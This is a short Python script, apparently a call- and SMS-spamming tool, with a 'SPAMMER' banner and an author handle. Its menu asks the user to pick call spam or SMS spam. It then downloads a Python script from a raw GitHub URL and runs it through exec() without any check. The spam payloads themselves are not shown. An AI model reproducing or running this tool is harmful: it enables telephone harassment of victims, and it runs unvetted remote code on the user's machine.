import requests

def run_script_from_url(url):
    try:
        # تحميل محتويات السكريبت من الرابط
        response = requests.get(url)
        response.raise_for_status()  # يثير استثناءً إذا كانت حالة الاستجابة غير ناجحة
        
        # تنفيذ السكريبت
        exec(response.text)
    except requests.RequestException as e:
        print(f" failed: ")
    except Exception as e:
        print(f"An error occurred")

def menu():
    print('''

==================================================================
= ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗  =
= ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗ =
= ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝ =
= ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗ =
= ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║ =
= ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ =
==================================================================

            Dev By Ghalwash User : @Mrfa0gh
    ''')
    choice = input("        Choose an option (1 spam Calls or 2 spam SMS): =>> ")
    return choice

if __name__ == "__main__":
    user_choice = menu()
    
    if user_choice == '1':
        run_script_from_url('https://raw.githubusercontent.com/faresMshams/faresMshams/main/calls.py')
    elif user_choice == '2':
        run_script_from_url('https://raw.githubusercontent.com/faresMshams/faresMshams/main/sms.py')
    else:
        print("Invalid choice. Please select 1 or 2.")
